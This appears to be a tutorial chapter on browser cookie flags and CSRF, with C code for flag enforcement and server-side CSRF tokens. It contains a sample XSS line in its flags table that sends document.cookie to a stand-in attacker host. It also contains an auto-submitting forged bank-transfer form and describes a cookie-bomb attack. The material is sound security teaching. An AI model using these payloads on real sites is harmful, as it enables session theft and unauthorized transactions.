BROWSER B17 — COOKIES & CSRF

Session Tokens & Forgery

Cookies are the browser's memory across stateless HTTP. Every flag — Secure, HttpOnly, SameSite — is a defence against a specific attack. Miss one, and the browser helpfully sends your session token to sites you didn't intend.

01 — The Big Analogy

Head First Moment

A cookie is like a wristband at an amusement park. You show it at each ride and the ride operator knows you've already paid (authenticated). The problem: the browser is very eager to show your wristband — it shows it to every ride at that park, even ones you didn't choose to visit. CSRF tricks you into "visiting" a ride (bank transfer endpoint) you didn't want to.

SameSite=Strict tells the browser: "only show this wristband if the person walked through our front gate, not if someone sent them in via a shortcut from another park."

02 — Cookie Flags

FlagWhat it doesWithout it
Secure Only transmitted over HTTPS connections Cookie sent in plaintext over HTTP — visible to network observer or HTTP downgrade attacker
HttpOnly JavaScript cannot read via document.cookie XSS can steal the session token: fetch("//evil.com?c="+document.cookie)
SameSite=Strict Cookie not sent on any cross-site request CSRF possible — cross-site form POST includes cookie
SameSite=Lax Sent on top-level navigations (GET), not on subresource loads CSRF via GET requests still possible (e.g., state-changing GET endpoints)
SameSite=None Sent on all cross-site requests (must have Secure) Required for third-party cookies (ads, embeds) — maximum CSRF exposure 
/* cookie.c — parse Set-Cookie and enforce flags */
typedef struct {
    char  name[128];
    char  value[512];
    char  domain[256];
    char  path[256];
    int   secure;
    int   http_only;
    int   same_site;   /* 0=none, 1=lax, 2=strict */
    time_t expires;
} cookie_t;

int should_send_cookie(cookie_t *c, http_request_t *req,
                       int is_top_level_navigation) {
    /* Secure: only over HTTPS */
    if (c->secure && !req->is_https) return 0;

    /* SameSite check */
    int cross_site = !same_site_request(c->domain, req->origin);
    if (cross_site) {
        if (c->same_site == SAME_SITE_STRICT) return 0;
        if (c->same_site == SAME_SITE_LAX) {
            /* Lax: allow only GET top-level navigations */
            if (!is_top_level_navigation) return 0;
            if (strcmp(req->method, "GET") != 0) return 0;
        }
    }
    return 1;
}

03 — CSRF Attack and Defence

/* CSRF attack — attacker's page */
/* Victim is logged in to bank.com (session cookie exists) */
/* <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script> */

/* Browser POSTs to bank.com, automatically attaches session cookie.
   Without CSRF defence: transfer succeeds! */

/* CSRF TOKEN DEFENCE — server side */
void render_transfer_form(http_response_t *res, session_t *sess) {
    /* Generate a random token tied to this session */
    char csrf_token[33];
    generate_random_hex(csrf_token, sizeof(csrf_token));
    sess->csrf_token = strdup(csrf_token);

    /* Embed it in the form as a hidden field */
    fprintf(res->body,
        "<form method='POST' action='/transfer'>"
        "  <input type='hidden' name='csrf_token' value='%s'>"
        "  ...</form>", csrf_token);
}

void handle_transfer(http_request_t *req, session_t *sess) {
    const char *token = get_post_param(req, "csrf_token");
    if (!token || strcmp(token, sess->csrf_token) != 0) {
        send_403(req, "CSRF token invalid");
        return;
    }
    /* Token matches — request came from our own form */
    do_transfer(req);
}
SameSite=Strict Is the Modern Fix

With SameSite=Strict on the session cookie, the browser won't attach the cookie to any cross-site request — the CSRF attack's POST never includes credentials. CSRF tokens are still recommended as defence-in-depth, but SameSite=Strict alone stops classic CSRF. The risk: it also blocks the cookie when a user clicks a link to your site from another site, briefly breaking "deep links that require login."

05 — Brain Exercise

Sharpen Your Pencil

The CSRF token approach requires state on the server (session must store the expected token). Stateless APIs using JWT tokens in Authorization headers don't use cookies at all — and since the browser only auto-attaches cookies (not Authorization headers) to cross-site requests, JWT-in-header is CSRF-immune by construction.

But some developers store JWTs in cookies for browser convenience. A JWT in a cookie with no CSRF protection is just as vulnerable as a session cookie. Design a CSRF protection scheme for a JWT-in-cookie setup that doesn't require server-side state. (Hint: the "double submit cookie" pattern.)

There Are No Dumb Questions

Q: Can CSRF steal data, or just perform actions?
Classic CSRF can only trigger actions (POST, PUT, DELETE) — the attacker's page sends the request but, due to SOP (B03), cannot read the response. So CSRF is about performing unauthorized state-changing operations, not reading data. To steal data, the attacker needs XSS (to run code in the victim's origin) or CORS misconfiguration (to read cross-origin responses).
Q: What's the "cookie bomb" attack?
An attacker sets many large cookies for a domain (via XSS or a subdomain they control). On the next request to that domain, the browser sends all cookies — potentially exceeding the server's header size limit (usually ~8KB), causing a 400 error. This can be used as a DoS against specific users or as a bypass: force the auth cookie to be dropped so the server treats the request as unauthenticated and serves cached public content.
